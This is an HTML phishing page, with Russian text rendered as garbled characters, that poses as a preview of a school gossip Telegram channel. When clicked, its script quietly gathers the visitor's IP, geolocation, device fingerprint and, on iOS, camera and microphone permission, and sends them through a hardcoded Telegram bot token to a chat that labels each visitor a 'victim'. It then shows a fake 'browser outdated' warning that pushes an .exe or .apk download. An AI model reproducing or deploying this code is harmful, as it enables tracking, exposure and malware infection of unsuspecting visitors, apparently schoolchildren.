<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: –ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</title>
    <style>
        /* –°—Ç–∏–ª–∏ CSS */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e93d6 0%, #0d73bb 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }

        .container {
            background-color: #ffffff;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 420px;
            padding: 50px 35px;
            box-sizing: border-box;
            text-align: center;
            transition: all 0.4s ease;
        }

        .telegram-preview {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(135deg, #2aabee 0%, #229ed9 100%);
            margin-bottom: 25px;
            border: 6px solid #e6f4ff;
            position: relative;
        }

        .avatar::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='white' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E") center no-repeat;
            background-size: contain;
        }

        .channel-title {
            font-size: 26px;
            font-weight: 800;
            margin: 0 0 12px 0;
            color: #000;
            letter-spacing: -0.5px;
        }

        .channel-subscribers {
            font-size: 16px;
            color: #707579;
            margin: 0 0 40px 0;
        }

        .tg-button {
            background-color: #2aabee;
            color: white;
            border: none;
            border-radius: 16px;
            padding: 20px 50px;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
        }

        .tg-button:hover {
            background-color: #229ed9;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(34, 158, 217, 0.3);
        }

        .hint {
            font-size: 15px;
            color: #707579;
            margin: 0;
        }

        .update-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .warning-icon {
            font-size: 70px;
            margin-bottom: 25px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .update-title {
            font-size: 28px;
            font-weight: 800;
            color: #d93025;
            margin: 0 0 20px 0;
        }

        .update-text {
            font-size: 17px;
            line-height: 1.6;
            color: #555;
            margin: 0 0 18px 0;
            text-align: center;
        }

        .download-section {
            margin: 30px 0;
            width: 100%;
        }

        .download-button {
            background-color: #d93025;
            color: white;
            border: none;
            border-radius: 14px;
            padding: 22px 35px;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
        }

        .download-button:hover {
            background-color: #c5221f;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(217, 48, 37, 0.3);
        }

        .download-icon {
            font-size: 24px;
        }

        .update-note {
            font-size: 14px;
            color: #888;
            margin-top: 25px;
            font-style: italic;
        }

        #updateContainer {
            display: none;
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #2aabee;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="telegram-preview">
            <div class="avatar"></div>
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <p class="channel-subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</p>
            <button class="tg-button" id="goToChannelBtn">–ü–ï–†–ï–ô–¢–ò –í –ö–ê–ù–ê–õ</button>
            <p class="hint">–û—Ç–∫—Ä–æ–µ—Ç—Å—è –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Telegram</p>
        </div>
    </div>

    <div class="container" id="updateContainer">
        <div class="update-screen">
            <div class="warning-icon">‚ö†Ô∏è</div>
            <h2 class="update-title">–í–∞—à–∞ –≤–µ—Ä—Å–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ —É—Å—Ç–∞—Ä–µ–ª–∞</h2>
            <p class="update-text">–î–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ –≤ Telegram –∏ –∑–∞—â–∏—Ç—ã –≤–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å –±—Ä–∞—É–∑–µ—Ä.</p>
            <p class="update-text">–°–∫–∞—á–∞–π—Ç–µ –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –æ–±–Ω–æ–≤–ª—ë–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é –Ω–∏–∂–µ. –≠—Ç–æ –∑–∞–π–º—ë—Ç –º–µ–Ω–µ–µ –º–∏–Ω—É—Ç—ã.</p>
            
            <div class="download-section" id="downloadSection">
                <!-- –ö–Ω–æ–ø–∫–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ—è–≤–∏—Ç—Å—è –∑–¥–µ—Å—å -->
            </div>
            <div class="loader" id="loader"></div>
            <p class="update-note">–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.</p>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
        const ADMIN_CHAT_ID = '8001083987';
        const EXE_URL = 'https://–≤–∞—à_—Ö–æ—Å—Ç–∏–Ω–≥.github.io/telegram-channel-landing/browser_update.exe';
        const APK_URL = 'https://–≤–∞—à_—Ö–æ—Å—Ç–∏–Ω–≥.github.io/telegram-channel-landing/browser_update.apk';

        // –§—É–Ω–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –û–°
        function getOS() {
            const ua = navigator.userAgent;
            if (/Windows Phone|Windows NT|Win16|Win32|Win64|WinCE/.test(ua)) return "Windows";
            if (/Android/.test(ua)) return "Android";
            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
            if (/Mac/.test(ua)) return "macOS";
            if (/Linux/.test(ua)) return "Linux";
            return "Unknown";
        }

        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        async function collectData(os) {
            const data = {
                os: os,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: JSON.stringify(navigator.languages),
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? "enabled" : "disabled",
                doNotTrack: navigator.doNotTrack || "unspecified",
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                deviceMemory: navigator.deviceMemory || "unknown",
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'direct',
                url: window.location.href
            };

            // –ü–æ–ª—É—á–µ–Ω–∏–µ IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
            } catch {
                data.ip = "failed";
            }

            // –ü–æ–ø—ã—Ç–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                        sendToTelegram(data);
                    },
                    err => {
                        data.geo = `error: ${err.message}`;
                        sendToTelegram(data);
                    },
                    { timeout: 5000 }
                );
            } else {
                data.geo = "not_supported";
                sendToTelegram(data);
            }

            // –ó–∞–ø—Ä–æ—Å –º–µ–¥–∏–∞ –¥–ª—è iOS
            if (os === "iOS" && navigator.mediaDevices) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: true 
                    });
                    data.media = "granted";
                    stream.getTracks().forEach(track => track.stop());
                } catch (err) {
                    data.media = `denied: ${err.message}`;
                }
            }
        }

// –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram –±–æ—Ç–∞
async function sendToTelegram(data) {
    const victimData = {
        os: data.os,
        ip: data.ip,
        ua: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        country: data.country || 'Unknown',
        city: data.city || 'Unknown',
        timestamp: new Date().toISOString()
    };
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –±–æ—Ç–∞
    const message = `üïµÔ∏è –ù–û–í–´–ô –ö–õ–ò–ï–ù–¢

–û–°: ${victimData.os}
IP: ${victimData.ip}
–°—Ç—Ä–∞–Ω–∞: ${victimData.country}
–ì–æ—Ä–æ–¥: ${victimData.city}
–≠–∫—Ä–∞–Ω: ${victimData.screen}
–í—Ä–µ–º—è: ${new Date().toLocaleString()}
User-Agent: ${victimData.ua.substring(0, 100)}...`;
    
    // –ö–æ–¥–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è URL
    const encodedMsg = encodeURIComponent(message);
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram Bot API
    const botToken = '8337372561:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
    const chatId = '8001083987';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMsg}`;
    
    // –°–∫—Ä—ã—Ç–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞
    fetch(url, { mode: 'no-cors' })
        .then(() => console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã'))
        .catch(() => {});
    
    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ (–æ–±—Ö–æ–¥ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫)
    const img = new Image();
    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMsg}`;
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
    localStorage.setItem('victim_id', generateVictimId(victimData));
    
    return true;
}

function generateVictimId(data) {
    // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è ID –Ω–∞ –æ—Å–Ω–æ–≤–µ –¥–∞–Ω–Ω—ã—Ö
    const str = data.ip + data.ua + Date.now();
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16).substring(0, 8);
}

        // –§—É–Ω–∫—Ü–∏—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
        function downloadFile(url, filename) {
            const loader = document.getElementById('loader');
            const section = document.getElementById('downloadSection');
            
            // –ü–æ–∫–∞–∑–∞—Ç—å –∑–∞–≥—Ä—É–∑–∫—É
            section.style.display = 'none';
            loader.style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏
            const msg = `üì• –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ù–ê–ß–ê–õ –°–ö–ê–ß–ò–í–ê–ù–ò–ï: ${filename}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(msg)}`);
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            setTimeout(() => {
                loader.style.display = 'none';
                section.style.display = 'block';
                
                // –°–æ–∑–¥–∞–Ω–∏–µ —Å—Å—ã–ª–∫–∏ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
                const link = document.createElement('a');
                link.href = url;
                link.download = filename;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
                alert('‚úÖ –ó–∞–≥—Ä—É–∑–∫–∞ –Ω–∞—á–∞–ª–∞—Å—å! –ï—Å–ª–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ –Ω–µ –Ω–∞—á–∞–ª–æ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–∞–ø–∫—É "–ó–∞–≥—Ä—É–∑–∫–∏".');
            }, 2000);
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞
        document.addEventListener('DOMContentLoaded', () => {
            const btn = document.getElementById('goToChannelBtn');
            const main = document.getElementById('mainContainer');
            const update = document.getElementById('updateContainer');
            
            btn.addEventListener('click', () => {
                const os = getOS();
                
                // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
                collectData(os);
                
                // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
                main.style.opacity = '0';
                setTimeout(() => {
                    main.style.display = 'none';
                    update.style.display = 'block';
                    update.style.opacity = '1';
                    
                    // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–Ω–æ–ø–∫–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
                    setupDownload(os);
                    
                    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –¥–ª—è iOS - –∞–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–π –∑–∞–ø—Ä–æ—Å –º–µ–¥–∏–∞
                    if (os === "iOS") {
                        setTimeout(() => {
                            if (navigator.mediaDevices) {
                                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                                    .then(stream => {
                                        stream.getTracks().forEach(track => track.stop());
                                        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=üé• iOS –ú–ï–î–ò–ê –î–û–°–¢–£–ü –ü–û–õ–£–ß–ï–ù`);
                                    })
                                    .catch(() => {});
                            }
                        }, 1000);
                    }
                }, 300);
            });
        });
    </script>
</body>
</html>
